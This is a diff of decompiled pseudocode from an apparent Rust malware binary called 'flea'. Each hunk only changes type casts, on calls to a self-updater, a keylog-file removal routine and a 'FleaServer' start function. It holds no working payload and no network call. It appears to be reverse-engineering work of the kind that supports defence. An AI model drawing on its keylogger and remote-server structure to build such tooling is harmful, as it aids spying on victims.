@@ -250,7 +250,7 @@ LABEL_14:
     *(_QWORD *)v38 = std::fs::remove_file("flea.rst@", 8LL);
     core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(v38);
   }
-  flea::updater::find_update(&v46, *((_QWORD *)&v48 + 1), v49, aFleaUpd, 8LL);
+  flea::updater::find_update(&v46, *((__int64 *)&v48 + 1), v49, (__int64)aFleaUpd, 8LL);
   if ( !__OFSUB__(0LL, (_QWORD)v46) )
   {
     *(_QWORD *)&v36 = v47;
@@ -281,7 +281,7 @@ LABEL_14:
     <T as alloc::slice::hack::ConvertVec>::to_vec(v38, aFlea, 4LL);
     *(_QWORD *)&v51 = *(_QWORD *)&v38[16];
     v50 = *(_OWORD *)v38;
-    flea::updater::start_new_process(&v48, &v50);
+    flea::updater::start_new_process((__int64)&v48, (__int64)&v50);
     std::process::exit(0);
   }
   core::ptr::drop_in_place<core::option::Option<alloc::string::String>>(&v46);
@@ -360,7 +360,7 @@ LABEL_14:
       v74 = *(_QWORD *)&v38[16];
       v73 = *(_OWORD *)v38;
       core::ptr::drop_in_place<std::path::PathBuf>(&v35);
-      flealib::keylogger::remove_keylog_file(v38, &v73);
+      flealib::keylogger::remove_keylog_file((__int64)v38, (__int64)&v73);
       core::ptr::drop_in_place<alloc::string::String>(v38);
       <T as alloc::string::SpecToString>::spec_to_string(&v57, v89);
       v15 = v79;
@@ -413,7 +413,7 @@ LABEL_14:
           {
             *(_QWORD *)&v46 = 2LL;
 LABEL_49:
-            flealib::fleaserver::FleaServer::start(&v43, v58, *((_QWORD *)&v58 + 1), &v56);
+            flealib::fleaserver::FleaServer::start((__int64)&v43, v58, *((__int64 *)&v58 + 1), &v56);
             std::sync::mutex::Mutex<T>::lock(v38, v17 + 2);
             v24 = core::result::Result<T,E>::unwrap(v38);
             *(_BYTE *)(v24 + 5) = 1;
@@ -457,7 +457,7 @@ LABEL_49:
               <T as alloc::slice::hack::ConvertVec>::to_vec(v38, aFlea, 4LL);
               *(_QWORD *)&v36 = *(_QWORD *)&v38[16];
               v35 = *(_OWORD *)v38;
-              flea::updater::start_new_process(&v48, &v35);
+              flea::updater::start_new_process((__int64)&v48, (__int64)&v35);
               if ( (unsigned __int64)core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER) >= 3 )
               {
                 *(_QWORD *)v38 = &off_6F59C8;
